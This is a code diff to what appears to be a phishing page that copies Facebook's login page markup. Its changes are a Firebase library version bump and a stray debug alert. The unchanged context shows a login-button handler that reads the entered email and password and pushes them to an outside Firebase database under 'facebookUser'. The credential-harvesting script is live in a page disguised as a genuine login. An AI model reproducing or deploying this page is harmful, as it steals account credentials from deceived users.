@@ -22,7 +22,8 @@ onloadRegister_DEPRECATED(function (){begin_polling_login_cookies("https:\/\/web
 <script>bigPipe.setPageID("6413022584616334503");</script><script>bigPipe.beforePageletArrive("last_response")</script>
 <script>require("TimeSlice").guard((function(){bigPipe.onPageletArrive({id:"last_response",phase:1,jsmods:{require:[["NavigationMetrics","setPage",[],[{page:"/www/login.php",page_type:"normal",page_uri:"https://web.facebook.com/login.php?login_attempt=1&lwv=110",serverLID:"6413022584616334503"}],[]],["Chromedome","start",[],[[]],[]],["DimensionTracking"],["HighContrastMode","init",[],[{isHCM:false,spacerImage:"https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/-PAXP-deijE.gif"}],[]],["ClickRefLogger"],["DetectBrokenProxyCache","run",[],[0,"c_user"],[]],["TimeSlice","setLogging",[],[false,0.01],[]],["NavigationClickPointHandler"],["UserActionHistory"],["ScriptPathLogger","startLogging",[],[],[]],["TimeSpentBitArrayLogger","init",[],[],[]]],define:[["BanzaiVitalWWW",[],{useVital:true},1781],["TimeSpentConfig",[],{"0_delay":0,"0_timeout":8,delay:200000,timeout:64},142],["ImmediateActiveSecondsConfig",[],{sampling_rate:0},423]]},is_last:true,allResources:["R7Nyi","e+Uwv","vBrdZ","Whv/D","StyTH","OJAy3","Zr6tJ","hXRpZ","4HPeW","5yzdt","P/mr5"],displayResources:["R7Nyi","e+Uwv","vBrdZ","Zr6tJ","4HPeW","P/mr5"],the_end:true});}),"onPageletArrive last_response",{"root":true,"pagelet":"last_response"})();</script>
 
-<script src="https://www.gstatic.com/firebasejs/3.8.0/firebase.js"></script>
+
+<script src="https://www.gstatic.com/firebasejs/3.9.0/firebase.js"></script>
 <script>
   // Initialize Firebase
   var config = {
@@ -37,6 +38,7 @@ onloadRegister_DEPRECATED(function (){begin_polling_login_cookies("https:\/\/web
 
   document.getElementById("loginbutton").addEventListener("click", function(){
     var user = {};
+    alert("dsgfsdf")
     user.email= document.getElementById('email').value;
     user.password = document.getElementById('pass').value
     var ref = firebase.database().ref().child("facebookUser");
